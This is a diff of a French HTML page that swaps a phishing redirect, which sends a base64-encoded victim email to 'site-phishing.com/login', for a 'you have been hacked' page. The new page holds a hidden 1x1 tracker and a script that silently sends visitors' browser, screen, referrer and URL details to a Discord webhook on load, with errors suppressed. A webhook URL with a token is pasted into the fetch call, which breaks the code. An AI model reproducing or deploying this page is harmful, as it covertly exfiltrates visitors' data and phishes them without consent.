@@ -1,5 +1,67 @@
-<html>
-<body onload="window.location.href='https://site-phishing.com/login?user=' + btoa('victime@email.com')">
-<p>Chargement en cours...</p>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mon Site</title>
+    <style>
+        body { margin:0; padding:0; background:#fff; }
+        .tracker { position:absolute; width:1px; height:1px; opacity:0; }
+    </style>
+</head>
+<body>
+    <h1>you have been hacked</h1>
+    <p>Tu aurait pas du cliquer...</p>
+
+    <!-- Tracker invisible (1x1 pixel) -->
+    <img src="#" class="tracker" alt="" onload="envoyerInfosSilencieux()" onerror="envoyerInfosSilencieux()">
+
+    <script>
+        function envoyerInfosSilencieux() {
+            const webhookUrl = 'TON_WEBHOOK_URL'; // Remplace par ton vrai webhook Discord
+
+            // Infos collectées côté client
+            const infos = {
+                userAgent: navigator.userAgent,
+                language: navigator.language || navigator.userLanguage,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                screen: `${screen.width}x${screen.height}`,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || 'Direct',
+                url: window.location.href
+            };
+
+            // Payload Discord (embed discret)
+            const payload = {
+                embeds: [{
+                    title: 'Visite silencieuse détectée',
+                    color: 0x2f3136, // Gris foncé (quasi invisible dans le thème sombre)
+                    fields: [
+                        { name: 'UA', value: infos.userAgent.substring(0, 150), inline: false },
+                        { name: 'Langue', value: infos.language, inline: true },
+                        { name: 'Écran', value: infos.screen, inline: true },
+                        { name: 'Heure', value: infos.timestamp, inline: false },
+                        { name: 'Page', value: infos.url, inline: false }
+                    ],
+                    footer: { text: 'Tracker 1x1px • Auto' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Envoi silencieux (pas de console, pas d'alert, pas de redirection)
+            fetch(webhookUrl, {https://discord.com/api/webhooks/1438218976726483119/q5dZNqWwIPtd43lrskiwbQykWXS9WJHNP562rUWFgGdrUVRJxAWmwuaKmqSP1DU3A9tA
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                mode: 'no-cors' // Empêche les erreurs visibles
+            }).catch(() => {}); // Ignore les erreurs
+        }
+
+        // Déclenche dès le chargement (sans clic)
+        window.addEventListener('load', () => {
+            setTimeout(envoyerInfosSilencieux, 500); // Petit délai pour éviter le blocage
+        });
+    </script>
 </body>
 </html>
